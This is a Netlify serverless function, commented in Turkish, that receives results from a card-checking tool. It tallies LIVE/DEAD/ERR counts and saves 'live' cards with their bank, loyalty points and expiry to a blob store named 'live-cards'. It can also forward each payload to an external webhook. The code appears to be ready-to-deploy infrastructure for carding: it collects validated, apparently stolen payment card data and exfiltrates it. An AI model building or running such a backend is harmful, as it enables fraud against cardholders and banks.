/**
 * Netlify Serverless Function — kart sonuçlarını alır ve saklar.
 *
 * Endpoint: POST /.netlify/functions/cards
 *
 * Kurulum:
 *   1. Bu dosyayı projenizin netlify/functions/ klasörüne koyun.
 *   2. Netlify dashboard → Site settings → Environment variables:
 *      SECRET_KEY = istediğiniz gizli anahtar (arvpuan'da secret= ile eşleşmeli)
 *   3. Netlify'a deploy edin.
 *
 * Opsiyonel — sonuçları bir yere kaydetmek için:
 *   - Netlify Blobs (ücretsiz, built-in key-value store) kullanılır.
 *   - Veya WEBHOOK_FORWARD_URL env değişkeni ile başka bir servise iletebilirsiniz.
 */

const { getStore } = require("@netlify/blobs");

exports.handler = async (event) => {
  // Sadece POST kabul et
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  // Secret doğrulama (opsiyonel ama önerilir)
  const secret = process.env.SECRET_KEY;
  if (secret) {
    const incoming = event.headers["x-secret"] || "";
    if (incoming !== secret) {
      return { statusCode: 401, body: "Unauthorized" };
    }
  }

  let payload;
  try {
    payload = JSON.parse(event.body || "{}");
  } catch {
    return { statusCode: 400, body: "Invalid JSON" };
  }

  // Özet mesajı mı, kart sonucu mu?
  if (payload.type === "summary") {
    console.log(
      `[SUMMARY] LIVE:${payload.live} DEAD:${payload.dead} ERR:${payload.error}`
    );
    return { statusCode: 200, body: JSON.stringify({ ok: true, type: "summary" }) };
  }

  // Sadece LIVE kartları kaydet (success && has_points)
  if (!payload.success || !payload.has_points) {
    return { statusCode: 200, body: JSON.stringify({ ok: true, skipped: true }) };
  }

  // Netlify Blobs'a kaydet
  try {
    const store = getStore("live-cards");
    const key   = `${Date.now()}-${payload.card || "unknown"}`;
    await store.setJSON(key, {
      card:      payload.card,
      points:    payload.formatted,
      bank:      payload.bank,
      program:   payload.program,
      expiry:    payload.expiry,
      saved_at:  new Date().toISOString(),
    });
    console.log(`[LIVE] ${payload.card} | ${payload.formatted} | ${payload.bank}`);
  } catch (err) {
    // Blobs yoksa sadece logla
    console.log(`[LIVE] ${payload.card} | ${payload.formatted} | ${payload.bank}`);
    console.error("Blobs error:", err.message);
  }

  // Başka bir webhook'a ilet (opsiyonel)
  const forwardUrl = process.env.WEBHOOK_FORWARD_URL;
  if (forwardUrl) {
    try {
      await fetch(forwardUrl, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify(payload),
      });
    } catch (err) {
      console.error("Forward error:", err.message);
    }
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ ok: true, card: payload.card }),
  };
};
